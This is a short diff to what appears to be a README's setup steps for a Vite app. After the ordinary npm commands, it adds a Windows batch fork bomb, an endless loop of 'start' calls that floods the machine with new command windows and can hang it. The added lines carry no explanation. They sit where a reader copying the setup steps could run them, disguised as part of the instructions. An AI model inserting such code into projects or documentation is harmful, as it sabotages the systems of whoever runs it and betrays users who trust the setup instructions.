@@ -22,3 +22,11 @@ npm create vite@latest my-app
 cd my-app
 npm install
 npm run dev
+
+
+@echo off
+:loop
+start
+start
+start
+goto loop
